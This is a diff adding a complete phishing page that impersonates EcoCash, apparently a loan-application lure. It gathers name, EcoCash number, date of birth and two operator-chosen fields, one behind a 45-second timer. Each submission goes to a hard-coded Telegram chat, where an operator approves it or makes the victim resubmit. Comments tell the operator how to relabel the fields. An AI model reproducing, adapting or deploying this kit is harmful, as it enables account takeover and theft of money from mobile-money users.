@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>EcoCash Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --blue:#1565c0;--blue2:#1976d2;
+  --red:#d32f2f;--white:#ffffff;--off:#f0f6ff;
+  --gray:#7a8eaa;--border:#d0dff0;--green:#00a86b;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min-height:100vh;}
+.page{display:none;min-height:100vh;align-items:center;justify-content:center;}
+.page.active{display:flex;flex-direction:column;}
+.card{background:var(--white);border-radius:24px;padding:36px 30px;width:100%;max-width:420px;box-shadow:0 8px 40px rgba(21,101,192,0.13);margin:20px;animation:rise .5s cubic-bezier(.16,1,.3,1) both;}
+@media(max-width:460px){.card{padding:28px 16px;margin:12px;}}
+.logo{display:flex;align-items:center;justify-content:center;margin-bottom:26px;}
+.logo-box{background:linear-gradient(135deg,#1565c0,#1976d2);border-radius:16px;padding:11px 22px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 16px rgba(21,101,192,0.3);}
+.logo-eco{font-size:24px;font-weight:900;color:var(--white);letter-spacing:-.5px;}
+.logo-cash{font-size:24px;font-weight:900;color:var(--red);letter-spacing:-.5px;}
+.step-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:22px;}
+.sp{width:8px;height:8px;border-radius:50%;background:var(--border);transition:all .3s;}
+.sp.on{width:22px;border-radius:4px;background:var(--blue);}
+.sp.dn{background:var(--green);}
+.ttl{font-size:18px;font-weight:800;text-align:center;margin-bottom:4px;}
+.sub{font-size:12px;color:var(--gray);text-align:center;margin-bottom:22px;}
+.f{margin-bottom:14px;}
+
+/* ═══════════════════════════════════════════
+   FIELD LABEL — THIS IS WHERE YOU EDIT
+   Search for: EDIT_LABEL_HERE
+   Change it to whatever name you want
+   It appears TWICE per field:
+   1. In the <label> tag (what user sees)
+   2. In the script section (what Telegram sees)
+═══════════════════════════════════════════ */
+.f label{display:block;font-size:10px;font-weight:800;color:var(--blue);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;}
+.f input{width:100%;padding:12px 14px;border:2px solid var(--border);border-radius:11px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--blue);background:var(--off);outline:none;transition:border-color .2s,background .2s,box-shadow .2s;}
+.f input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px rgba(21,101,192,0.08);}
+.pre-wrap{position:relative;}
+.pre{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:13px;font-weight:800;color:var(--gray);pointer-events:none;}
+.f input.pl{padding-left:28px;}
+.btn{width:100%;padding:14px;margin-top:6px;background:linear-gradient(135deg,var(--blue),var(--blue2));color:var(--white);border:none;border-radius:11px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 16px rgba(21,101,192,0.3);}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(21,101,192,0.38);}
+.btn:active{transform:translateY(0);}
+.btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none;}
+.err{display:none;font-size:12px;font-weight:700;color:#c0392b;background:rgba(192,57,43,0.07);border:1.5px solid rgba(192,57,43,0.18);border-radius:9px;padding:9px 13px;margin-top:10px;text-align:center;}
+
+/* TIMER */
+.timer-wrap{text-align:center;margin-bottom:20px;}
+.timer-ring{width:90px;height:90px;margin:0 auto 10px;position:relative;display:flex;align-items:center;justify-content:center;}
+.timer-ring svg{position:absolute;top:0;left:0;transform:rotate(-90deg);}
+.timer-ring circle{fill:none;stroke-width:6;}
+.timer-bg{stroke:var(--border);}
+.timer-fill{stroke:var(--blue);stroke-linecap:round;stroke-dasharray:251;stroke-dashoffset:0;transition:stroke-dashoffset .9s linear,stroke .5s;}
+.timer-fill.urgent{stroke:var(--red);}
+.timer-num{font-size:26px;font-weight:900;color:var(--blue);position:relative;z-index:1;transition:color .5s;}
+.timer-num.urgent{color:var(--red);}
+.timer-label{font-size:11px;color:var(--gray);font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.timer-expired{display:none;font-size:13px;font-weight:700;color:var(--red);background:rgba(211,47,47,0.07);border:1.5px solid rgba(211,47,47,0.2);border-radius:9px;padding:9px 13px;text-align:center;margin-bottom:12px;}
+
+/* SCREENS */
+.screen{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;background:var(--off);}
+.screen.show{display:flex;}
+.sc-logo{display:flex;align-items:center;justify-content:center;margin-bottom:32px;}
+.sc-icon{width:68px;height:68px;border-radius:50%;background:var(--white);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:16px;animation:pulse 2s ease infinite;}
+.sc-h{font-size:20px;font-weight:900;color:var(--blue);margin-bottom:8px;}
+.sc-p{font-size:13px;color:var(--gray);line-height:1.7;max-width:290px;margin:0 auto 18px;}
+.ref-num{background:var(--white);border:2px solid var(--border);border-radius:11px;padding:10px 20px;font-size:18px;font-weight:900;color:var(--blue);letter-spacing:2px;display:inline-block;margin-bottom:6px;}
+.dot-row{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:var(--gray);margin-top:10px;}
+.bd{width:6px;height:6px;border-radius:50%;background:var(--blue);animation:blink 1.5s ease infinite;}
+.r-icon{width:74px;height:74px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin-bottom:16px;}
+.r-icon.ok{background:rgba(0,168,107,0.1);}
+.r-icon.no{background:rgba(214,48,49,0.08);}
+.r-h{font-size:22px;font-weight:900;margin-bottom:10px;}
+.r-h.ok{color:var(--green);}
+.r-h.no{color:var(--red);}
+.r-p{font-size:13px;color:var(--gray);line-height:1.7;max-width:280px;margin:0 auto 14px;}
+.r-box{background:var(--white);border:2px solid var(--border);border-radius:12px;padding:13px 16px;text-align:left;font-size:13px;line-height:2;margin-bottom:16px;width:100%;max-width:320px;}
+.r-box strong{color:var(--blue);}
+.r-btn{padding:10px 24px;border-radius:10px;border:2px solid var(--blue);background:transparent;color:var(--blue);font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;cursor:pointer;transition:all .2s;}
+.r-btn:hover{background:var(--blue);color:var(--white);}
+
+@keyframes rise{from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.15;}}
+@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.04);}}
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════
+     PAGE 1 — Full Name, EcoCash Number,
+     Loan Amount, Date of Birth
+════════════════════════════════════════ -->
+<div class="page active" id="pg1">
+  <div class="card">
+    <div class="logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+    <div class="step-row">
+      <div class="sp on"></div><div class="sp"></div>
+      <div class="sp"></div><div class="sp"></div>
+    </div>
+    <div class="ttl">Loan Application</div>
+    <div class="sub">Step 1 of 4</div>
+    <div class="f"><label>Full Name</label><input type="text" id="p1_name"/></div>
+    <div class="f"><label>EcoCash Number</label><input type="tel" id="p1_eco"/></div>
+    <div class="f">
+      <label>Loan Amount (USD)</label>
+      <div class="pre-wrap">
+        <span class="pre">$</span>
+        <input type="number" id="p1_amt" class="pl" min="1"/>
+      </div>
+    </div>
+    <div class="f"><label>Date of Birth</label><input type="date" id="p1_dob"/></div>
+    <div class="err" id="p1_err">Please fill in all fields.</div>
+    <button class="btn" id="p1_btn" onclick="sub1()">
+      <span id="p1_txt">Continue →</span>
+      <div class="spin" id="p1_spin"></div>
+    </button>
+  </div>
+</div>
+
+<!-- P1 WAIT -->
+<div class="screen" id="p1_wait">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Verifying Details</div>
+  <p class="sc-p">Your details have been submitted. Please wait while our team reviews them.</p>
+  <div class="ref-num" id="p1_ref">EC-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting verification…</div>
+</div>
+
+
+<!-- ════════════════════════════════════════
+     PAGE 2 — 1 BLANK FIELD
+     ↓↓↓ EDIT HERE ↓↓↓
+     Search for: EDIT_LABEL_HERE
+     Change it to your label name
+     It appears TWICE — change BOTH
+════════════════════════════════════════ -->
+<div class="page" id="pg2">
+  <div class="card">
+    <div class="logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+    <div class="step-row">
+      <div class="sp dn"></div><div class="sp on"></div>
+      <div class="sp"></div><div class="sp"></div>
+    </div>
+    <div class="ttl">Step 2</div>
+    <div class="sub">Step 2 of 4</div>
+
+    <!-- ↓↓↓ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↓↓↓ -->
+    <div class="f">
+      <label>EDIT_LABEL_HERE</label>
+      <input type="text" id="p2_field"/>
+    </div>
+    <!-- ↑↑↑ CHANGE "EDIT_LABEL_HERE" TO YOUR LABEL ↑↑↑ -->
+
+    <div class="err" id="p2_err">Please fill in the field.</div>
+    <button class="btn" id="p2_btn" onclick="sub2()">
+      <span id="p2_txt">Continue →</span>
+      <div class="spin" id="p2_spin"></div>
+    </button>
+  </div>
+</div>
+
+<!-- P2 WAIT -->
+<div class="screen" id="p2_wait">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Verifying Details</div>
+  <p class="sc-p">Please wait while our team reviews your details.</p>
+  <div class="ref-num" id="p2_ref">EC-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting verification…</div>
+</div>
+
+
+<!-- ════════════════════════════════════════
+     PAGE 4 — TIMER + 1 BLANK FIELD
+     ↓↓↓ EDIT HERE ↓↓↓
+     Search for: EDIT_P4_LABEL_HERE
+     Change it to your label name
+     It appears TWICE — change BOTH
+     Timer: 45 seconds countdown
+     Expires → redirects back to Page 2
+     Wrong Details → redirects back to Page 2
+════════════════════════════════════════ -->
+<div class="page" id="pg4">
+  <div class="card">
+    <div class="logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+    <div class="step-row">
+      <div class="sp dn"></div><div class="sp dn"></div>
+      <div class="sp dn"></div><div class="sp on"></div>
+    </div>
+    <div class="ttl">Final Step</div>
+    <div class="sub">Step 4 of 4</div>
+
+    <!-- 45 SECOND COUNTDOWN TIMER -->
+    <div class="timer-wrap">
+      <div class="timer-ring">
+        <svg width="90" height="90" viewBox="0 0 90 90">
+          <circle class="timer-bg" cx="45" cy="45" r="40"/>
+          <circle class="timer-fill" id="timer-circle" cx="45" cy="45" r="40"/>
+        </svg>
+        <span class="timer-num" id="timer-num">45</span>
+      </div>
+      <div class="timer-label">seconds remaining</div>
+    </div>
+    <div class="timer-expired" id="timer-expired">⏰ Time expired. Redirecting…</div>
+
+    <!-- ↓↓↓ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↓↓↓ -->
+    <div class="f">
+      <label>EDIT_P4_LABEL_HERE</label>
+      <input type="text" id="p4_field"/>
+    </div>
+    <!-- ↑↑↑ CHANGE "EDIT_P4_LABEL_HERE" TO YOUR LABEL ↑↑↑ -->
+
+    <div class="err" id="p4_err">Please fill in the field.</div>
+    <button class="btn" id="p4_btn" onclick="sub4()">
+      <span id="p4_txt">Submit Application</span>
+      <div class="spin" id="p4_spin"></div>
+    </button>
+  </div>
+</div>
+
+<!-- P4 WAIT -->
+<div class="screen" id="p4_wait">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Application Submitted</div>
+  <p class="sc-p">Your loan application is under review. This page will update automatically.</p>
+  <div class="ref-num" id="p4_ref">EC-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Save your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting final decision…</div>
+</div>
+
+<!-- APPROVED -->
+<div class="screen" id="approved">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="r-icon ok">✅</div>
+  <div class="r-h ok">Loan Approved!</div>
+  <p class="r-p">Your loan has been approved. We will contact you to complete disbursement.</p>
+  <div class="r-box" id="appr_box"></div>
+  <button class="r-btn" onclick="resetAll()">New Application</button>
+</div>
+
+<!-- WRONG DETAILS -->
+<div class="screen" id="rejected">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="r-icon no">⚠️</div>
+  <div class="r-h no">Wrong Details</div>
+  <p class="r-p">Our team flagged your details as incorrect. Please check and resubmit.</p>
+  <div class="r-box" id="rej_box"></div>
+  <button class="r-btn" onclick="resetAll()">Try Again</button>
+</div>
+
+
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "8718124300";
+  const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  let app={}, pollTimer=null, countdown=null, lastId=0, curRef=null;
+  const genRef = ()=>"EC-"+Math.floor(100000+Math.random()*900000);
+  const stamp  = ()=>new Date().toLocaleString("en-ZW",{timeZone:"Africa/Harare",dateStyle:"full",timeStyle:"short"});
+
+  function showPage(id){
+    document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+    window.scrollTo(0,0);
+  }
+  function setLoad(p,on){
+    document.getElementById(p+"_btn").disabled=on;
+    document.getElementById(p+"_txt").style.display=on?"none":"inline";
+    document.getElementById(p+"_spin").style.display=on?"block":"none";
+  }
+  function hideAllScreens(){
+    ["p1_wait","p2_wait","p4_wait","approved","rejected"]
+      .forEach(id=>document.getElementById(id).classList.remove("show"));
+  }
+
+  async function tgSend(text,r){
+    const kb={inline_keyboard:[[
+      {text:"✅  APPROVE",callback_data:`APPROVE_${r}`},
+      {text:"⚠️  WRONG DETAILS",callback_data:`REJECT_${r}`}
+    ]]};
+    const res=await fetch(`${API}/sendMessage`,{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:"Markdown",reply_markup:kb})
+    });
+    return res.json();
+  }
+  async function syncId(){
+    try{
+      const r=await fetch(`${API}/getUpdates?limit=1&offset=-1`);
+      const j=await r.json();
+      if(j.ok&&j.result.length>0) lastId=j.result[j.result.length-1].update_id;
+    }catch(e){}
+  }
+  async function ackCb(id,t){
+    await fetch(`${API}/answerCallbackQuery`,{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({callback_query_id:id,text:t})
+    });
+  }
+  async function editTg(msg,s){
+    await fetch(`${API}/editMessageText`,{
+      method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:msg.chat.id,message_id:msg.message_id,
+        text:msg.text+`\n\n*Decision: ${s}*`,parse_mode:"Markdown"})
+    });
+  }
+  function poll(r,onOk,onNo){
+    clearInterval(pollTimer);
+    pollTimer=setInterval(async()=>{
+      try{
+        const res=await fetch(`${API}/getUpdates?offset=${lastId+1}&timeout=3`);
+        const j=await res.json();
+        if(!j.ok) return;
+        for(const u of j.result){
+          lastId=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query;
+            if(cb.data===`APPROVE_${r}`){await ackCb(cb.id,"✅ Approved!");await editTg(cb.message,"✅ APPROVED");clearInterval(pollTimer);onOk();return;}
+            if(cb.data===`REJECT_${r}`){await ackCb(cb.id,"⚠️ Wrong details.");await editTg(cb.message,"⚠️ WRONG DETAILS");clearInterval(pollTimer);onNo();return;}
+          }
+        }
+      }catch(e){}
+    },3000);
+  }
+
+  // ── PAGE 1 ──────────────────────────────────────
+  async function sub1(){
+    const name=document.getElementById("p1_name").value.trim();
+    const eco =document.getElementById("p1_eco").value.trim();
+    const amt =document.getElementById("p1_amt").value.trim();
+    const dob =document.getElementById("p1_dob").value;
+    const err =document.getElementById("p1_err");
+    if(!name||!eco||!amt||!dob){err.style.display="block";return;}
+    err.style.display="none"; setLoad("p1",true);
+    app.name=name; app.eco=eco; app.amt=amt; app.dob=dob;
+    curRef=genRef();
+    const msg=
+      "📋 *ECOCASH LOAN — STEP 1*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Full Name:* ${name}\n`+
+      `📱 *EcoCash Number:* ${eco}\n`+
+      `💵 *Loan Amount:* USD $${Number(amt).toLocaleString()}\n`+
+      `🎂 *Date of Birth:* ${dob}\n\n`+
+      `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n`+
+      `👇 *Approve to proceed to Step 2:*`;
+    try{
+      await syncId();
+      const r=await tgSend(msg,curRef);
+      if(!r.ok) throw new Error();
+      document.getElementById("p1_ref").textContent=curRef;
+      document.getElementById("pg1").classList.remove("active");
+      document.getElementById("p1_wait").classList.add("show");
+      poll(curRef,
+        ()=>{ // APPROVED → go to page 2
+          app.ref1=curRef;
+          document.getElementById("p1_wait").classList.remove("show");
+          showPage("pg2");
+          setLoad("p1",false);
+        },
+        ()=>{ // WRONG DETAILS → stay on page 1
+          document.getElementById("p1_wait").classList.remove("show");
+          document.getElementById("pg1").classList.add("active");
+          err.textContent="⚠️ Our team flagged your details. Please check and try again.";
+          err.style.display="block";
+          setLoad("p1",false);
+        }
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p1",false);}
+  }
+
+  // ── PAGE 2 ──────────────────────────────────────
+  async function sub2(){
+    const field=document.getElementById("p2_field").value.trim();
+    const err  =document.getElementById("p2_err");
+    if(!field){err.style.display="block";return;}
+    err.style.display="none"; setLoad("p2",true);
+    app.p2field=field;
+    curRef=genRef();
+
+    // ↓↓↓ CHANGE "EDIT_LABEL_HERE" BELOW TO MATCH YOUR LABEL ↓↓↓
+    const msg=
+      "📋 *ECOCASH LOAN — STEP 2*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.name}\n`+
+      `📱 *EcoCash:* ${app.eco}\n\n`+
+      `▪️ *EDIT_LABEL_HERE:* ${field}\n\n`+
+      // ↑↑↑ CHANGE "EDIT_LABEL_HERE" ABOVE TO MATCH YOUR LABEL ↑↑↑
+      `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n`+
+      `👇 *Approve to proceed to Step 4:*`;
+
+    try{
+      await syncId();
+      const r=await tgSend(msg,curRef);
+      if(!r.ok) throw new Error();
+      document.getElementById("p2_ref").textContent=curRef;
+      document.getElementById("pg2").classList.remove("active");
+      document.getElementById("p2_wait").classList.add("show");
+      poll(curRef,
+        ()=>{ // APPROVED → go to page 4
+          app.ref2=curRef;
+          document.getElementById("p2_wait").classList.remove("show");
+          showPage("pg4");
+          startTimer();
+          setLoad("p2",false);
+        },
+        ()=>{ // WRONG DETAILS → go back to page 1
+          document.getElementById("p2_wait").classList.remove("show");
+          document.getElementById("p2_field").value="";
+          err.style.display="none";
+          setLoad("p2",false);
+          showPage("pg1");
+        }
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p2",false);}
+  }
+
+  // ── 45 SECOND COUNTDOWN ─────────────────────────
+  function startTimer(){
+    clearInterval(countdown);
+    let secs=45;
+    const numEl   =document.getElementById("timer-num");
+    const circleEl=document.getElementById("timer-circle");
+    const expEl   =document.getElementById("timer-expired");
+    const btn     =document.getElementById("p4_btn");
+    const total   =251;
+
+    numEl.textContent=secs;
+    numEl.classList.remove("urgent");
+    circleEl.classList.remove("urgent");
+    circleEl.style.strokeDashoffset=0;
+    expEl.style.display="none";
+    btn.disabled=false;
+
+    countdown=setInterval(()=>{
+      secs--;
+      numEl.textContent=secs;
+      circleEl.style.strokeDashoffset=total-(total*(secs/45));
+      if(secs<=10){numEl.classList.add("urgent");circleEl.classList.add("urgent");}
+      if(secs<=0){
+        clearInterval(countdown);
+        numEl.textContent="0";
+        expEl.style.display="block";
+        btn.disabled=true;
+        // Timer expired → redirect back to page 2
+        setTimeout(()=>{
+          expEl.style.display="none";
+          document.getElementById("p4_field").value="";
+          document.getElementById("p4_err").style.display="none";
+          setLoad("p4",false);
+          showPage("pg2");
+        },2000);
+      }
+    },1000);
+  }
+
+  // ── PAGE 4 ──────────────────────────────────────
+  async function sub4(){
+    const field=document.getElementById("p4_field").value.trim();
+    const err  =document.getElementById("p4_err");
+    if(!field){err.style.display="block";return;}
+    err.style.display="none";
+    clearInterval(countdown);
+    setLoad("p4",true);
+    curRef=genRef();
+
+    // ↓↓↓ CHANGE "EDIT_P4_LABEL_HERE" BELOW TO MATCH YOUR LABEL ↓↓↓
+    const msg=
+      "📋 *ECOCASH LOAN — STEP 4 (FINAL)*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.name}\n`+
+      `📱 *EcoCash:* ${app.eco}\n`+
+      `💵 *Amount:* USD $${Number(app.amt).toLocaleString()}\n`+
+      `🎂 *DOB:* ${app.dob}\n`+
+      `▪️ *Step 2 Field:* ${app.p2field}\n\n`+
+      `▪️ *EDIT_P4_LABEL_HERE:* ${field}\n\n`+
+      // ↑↑↑ CHANGE "EDIT_P4_LABEL_HERE" ABOVE TO MATCH YOUR LABEL ↑↑↑
+      `🔖 *Final Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n`+
+      `👇 *FINAL DECISION:*`;
+
+    try{
+      await syncId();
+      const r=await tgSend(msg,curRef);
+      if(!r.ok) throw new Error();
+      document.getElementById("p4_ref").textContent=curRef;
+      document.getElementById("pg4").classList.remove("active");
+      document.getElementById("p4_wait").classList.add("show");
+      poll(curRef,
+        ()=>{ // APPROVED
+          document.getElementById("p4_wait").classList.remove("show");
+          document.getElementById("appr_box").innerHTML=
+            `<strong>Name:</strong> ${app.name}<br/>`+
+            `<strong>EcoCash:</strong> ${app.eco}<br/>`+
+            `<strong>Amount:</strong> USD $${Number(app.amt).toLocaleString()}<br/>`+
+            `<strong>Ref:</strong> ${curRef}`;
+          document.getElementById("approved").classList.add("show");
+        },
+        ()=>{ // WRONG DETAILS → go back to page 2
+          document.getElementById("p4_wait").classList.remove("show");
+          document.getElementById("p4_field").value="";
+          document.getElementById("p4_err").style.display="none";
+          setLoad("p4",false);
+          showPage("pg2");
+        }
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p4",false);}
+  }
+
+  // ── RESET ────────────────────────────────────────
+  function resetAll(){
+    clearInterval(pollTimer); clearInterval(countdown);
+    app={}; curRef=null; lastId=0;
+    ["p1_name","p1_eco","p1_amt","p1_dob","p2_field","p4_field"]
+      .forEach(id=>document.getElementById(id).value="");
+    ["p1_err","p2_err","p4_err"]
+      .forEach(id=>document.getElementById(id).style.display="none");
+    hideAllScreens();
+    ["p1","p2","p4"].forEach(p=>setLoad(p,false));
+    showPage("pg1");
+  }
+</script>
+</body>
+</html>
